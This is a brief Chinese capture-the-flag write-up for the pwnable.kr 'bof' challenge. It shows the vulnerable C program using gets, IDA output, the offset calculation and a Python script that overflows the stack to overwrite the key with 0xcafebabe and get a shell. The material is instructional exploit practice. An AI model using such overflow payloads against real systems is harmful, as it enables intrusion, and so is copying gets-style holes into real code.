# bof
## 1.分析逻辑
```c
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
当函数参数为0xcafebabe时，输出flag
## 2.漏洞
容易注意到函数内存在gets，因此可进行栈溢出
## 3.利用
IDA查看缓冲区位置

```c
char s; // [esp+1Ch] [ebp-2Ch]
unsigned int v3; // [esp+3Ch] [ebp-Ch]
v3 = __readgsdword(0x14u);
puts("overflow me : ");
gets(&s);
```

为了覆盖到参数，需要覆盖0x2c+4+4=0x34字节（包括bp和返回地址）
```python
from pwn import *
from zio3 import *
target = ('pwnable.kr',9000)
io = zio('./bof')
io = zio(target,timeout=10000)
#io.read_until("overflow me : ")
payload = b'a' * (0x2c+8)+l32(0xcafebabe)
io.write(payload)
io.interact()
```